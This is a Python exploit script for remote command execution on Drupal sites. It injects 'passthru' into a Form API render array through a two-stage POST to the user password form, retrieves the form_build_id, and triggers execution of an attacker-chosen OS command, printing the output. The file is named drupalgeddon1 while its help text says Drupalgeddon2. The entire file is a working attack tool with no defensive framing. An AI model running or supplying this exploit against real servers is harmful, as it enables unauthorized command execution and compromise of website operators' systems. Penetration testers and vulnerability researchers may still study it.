#!/usr/bin/python3

R = "\033[1;31m"  # Red
Y = "\033[1;33m"  # Yellow
C = "\033[1;36m"  # Cyan
W = "\033[0m"     # White

import argparse
import requests
import re


# usage example
'''
$ python3 drupalgeddon1.py -u "http://target/" -c 'id;pwd'
'''

def get_drupal_version(url, http_headers):
    resp = requests.get(url, headers=http_headers, verify=False)
    if resp.status_code == 200:
        xgen = resp.headers['X-Generator']                  # For example: 'Drupal 8 (https://www.drupal.org)'
        return xgen[7:8]                                    # If Drupal 7 ==> xgen[7:8] = '7'. If Drupal 8 ==> xgen[7:8] = '8'
    else:
        return False



def drupalgeddon_1_exploit(url, http_headers ,command):
    
    parameters = {
            'q'                    : 'user/password', 
            'name[#post_render][]' : 'passthru', 
            'name[#type]'          : 'markup',
            'name[#markup]'        : command, 
    }
    
    payload    = {
            'form_id'                  : 'user_pass', 
            '_triggering_element_name' : 'name',
    }
    
    try:
        # send POST Request : stage 1
        print(f"\n{Y}Starting Stage 1...{W}")
        r = requests.post(url, data=payload, params=parameters, headers=http_headers, timeout=5)
        
        # GET form_build_id: stage 2
        print(f"\n{Y}Starting Stage 2...{W}")
        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
        if m:
            # Match.group(): Returns one or more subgroups of the match. 
            # If there is a single argument, the result is a single string; 
            # if there are multiple arguments, the result is a tuple with one item per argument.
            form_build_id = m.group(1)                           # The first parenthesized subgroup.
            print(f'{R}form_build_id: {C}{form_build_id}{W}')
            
            parameters = {
                    'q':f'file/ajax/name/#value/{form_build_id}'
            }
            
            data       = {
                    'form_build_id':form_build_id
            }
            
            r = requests.post(url, data=data, params=parameters, headers=http_headers, timeout=5)
            r.encoding = 'ISO-8859-1'
            a = r.content.decode().split("[{")
            command_output = a[0]
            print(f"\n{R}Exploit Results:\n{C}{command_output}{W}")
        else:
            print("Unable to get 'form_build_id'")
    except Exception as e:
        print(f"{R}Exception When Sending The Exploit: {Y}{e}{W}")





def main():
    
    # construct the HTTP headers dictionary
    http_headers={}
    for header in headers:
        key, value = header.split(':')
        http_headers[key] = value

    # get drupal version
    drupal_version = get_drupal_version(target_url, http_headers)
    print(f"{R}Drupal version: {C}{drupal_version}{W}")
    
    # exploit drupal
    drupalgeddon_1_exploit(target_url, http_headers, os_command)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Drupalgeddon2 exploit")
    parser.add_argument("-u", "--url",       help="url in the format http(s)://subdomain/")
    parser.add_argument("-c", "--command",   help="command to be executed", default='echo pwned')
    parser.add_argument('-H', '--headers', metavar='Header:Value', nargs='*', action='append', default=[["User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"]], type=str, help='HTTP headers to include in the request. Format: "Header:Value"')

    # getting command arguments
    args    = parser.parse_args()
    if args.url == None:
        print("missing Target url")
        exit(-1)
    target_url  = args.url
    os_command  = args.command
    headers     = [item for sublist in args.headers for item in sublist]
    
    # call main function
    main() 

